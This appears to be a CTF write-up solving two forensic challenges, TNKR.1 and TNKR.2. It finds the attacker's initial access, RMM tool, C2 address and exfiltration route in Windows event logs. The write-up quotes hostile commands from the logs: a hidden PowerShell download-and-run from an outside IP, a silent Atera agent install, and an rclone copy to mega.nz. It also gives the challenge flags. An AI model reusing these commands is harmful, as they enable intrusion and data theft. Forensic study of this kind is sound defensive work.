---
title: "EG_CERT_CTF_2025_TNKR.1_&_TNKR.2"
date: 2025-12-28 00:00:00
categories: [CTF_competitions]
tags: [Disk_Forensics, Medium, [Event_logs]]
toc: true
---

## TNKR.1

## Description:

The goal of this challenge is to analyze a provided archive containing system artifacts and determine:

What command-line entry was used as an indicator of initial access.
The email address the attacker used when logging in via an RMM tool suspected of being used for data exfiltration.
Flag Format : EGCTF{xyz}

After download lab file and extract it you can found 3 Artifacts DC1 & Desktop6 & file5 I will start with search in Desktop logs Event to check any suspicious command run in this machine

I am use chainsaw to filter the the Event logs quickly

```bash
chainsaw search powershell.exe -i Microsoft-Windows-Sysmon%254Operational.evtx --json | gron | grep -E '\.EventID = 1;|\.CommandLine'

```

that is good I Found suspicious command run to get initial access in this machine >>

```bash
C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe -WindowStyle Hidden -c iwr http://34.29.169.45:8883/iexploreplugin.exe -OutFile $env:TEMP\\iexploreplugin.exe; Start-Process $env:TEMP\iexploreplugin.exe

```

from the first look you can determine is a suspicious command “IOCs”

`IP & PORT → 34.29.169.45:8883`
`Payload → iexploreplugin.exe`

what is The email address the attacker used when logging in via an RMM tool suspected of being used for data exfiltration.

You can find the email in the Sysmon logs, or after browsing the files, you may find a configuration file in the Recycle Bin that contains both an email and a password.

```bash
Sysmon Event → C:\\Windows\\system32\\cmd.exe\” /C \”curl -L -o setup.msi \”https://HelpdeskSupport1739412763610.servicedesk.atera.com/GetAgent/Msi/?customerId=1&integratorLogin=bunion_sneaker.4m%%40icloud.com&accountId=001Q300000QtbftIAB\" && msiexec /i setup.msi /qn IntegratorLogin=bunion_sneaker.4m@icloud.com CompanyId=1 AccountId=001Q300000QtbftIAB

```

```bash
config file → [mega]
type = mega
user = bunion_sneaker.4m@icloud.com
pass = 4MLGng2nuSQHu1vuY_yZYJKIRuggpN1oaaufD7d8QbsWZY1q

```
# flag

```bash
 Flag is → EGCTF{ iwr http://34.29.169.45:8883/iexploreplugin.exe -OutFile $env:TEMP\\iexploreplugin.exe; Start-Process $env:TEMP\iexploreplugin.exe,bunion_sneaker.4m@icloud.com}

 ```


## TNKR.2

## Description:

The goal of this challenge is to analyze a provided archive containing system artifacts and determine the Command and Control (C2) server and domain involved in data exfiltration.

in the challenge i will use hayabuse tool to make it more easy hayabuse tool containment rule to detect suspicious event

```bash
./hayabusa json-timeline -d /tnkr/Artifacts/files5-C.b3fd34138d23e431/uploads/auto/C%3A/Windows/System32/winevt/Logs/ > timelline.json

```

after investigate in output file you can found python script make connection with external ip address

```bash
[0m{
    "Timestamp": "2025-03-25 11:04:49.849 -07:00",
    "RuleTitle": "PwSh Scriptblock",
    "Level": "info",
    "Computer": "files5.starktech.local",
    "Channel": "PwSh",
    "EventID": 4104,
    "RecordID": 11319,
    "Details": {
        "ScriptBlock": "C:\\ProgramData\\python\\pythonw.exe C:\\ProgramData\\python\\testc.py"
    
```

```bash
[0m{
    "Timestamp": "2025-03-25 11:06:57.776 -07:00",
    "RuleTitle": "Net Conn (Sysmon Alert)",
    "Level": "med",
    "Computer": "files5.starktech.local",
    "Channel": "Sysmon",
    "EventID": 3,
    "RecordID": 30201,
    "Details": {
        "Initiated": true,
        "Proto": "tcp",
        "SrcIP": "10.135.85.18",
        "SrcPort": 51239,
        "SrcHost": "-",
        "TgtIP": "104.21.76.201",
        "TgtPort": 8443,
        "TgtHost": "-",
        "User": "FILES5\\admin143",
        "Proc": "C:\\ProgramData\\python\\pythonw.exe",
        "PID": 6764,
        "PGUID": "236BF50D-F041-67E2-8B07-000000000500"

```

now i have the ip address 104.21.76.201 and need get domain usage in date exfiltration

after investigate the event logs i found the attacker usage rclone.exe to upload data to mega.nz

```bash
chainsaw search . -i Microsoft-Windows-Sysmon%254Operational.evtx --json | gron | grep -E "\.EventID = 1;|\.CommandLine"

```

```bash
the command line is → C:\\Users\\Public\\rclone+config\\rclone.exe\” copy C:\\ProgramData\\Microsoft\\Teams mega:V1A

```

```bash
rclone.exe configuration file → [mega]
type = mega
user = bunion_sneaker.4m@icloud.com
pass = 4MLGng2nuSQHu1vuY_yZYJKIRuggpN1oaaufD7d8QbsWZY1q

```
# flag

```bash
flag is: {104.21.76.201,mega.nz}
```


# Thanks For Reading

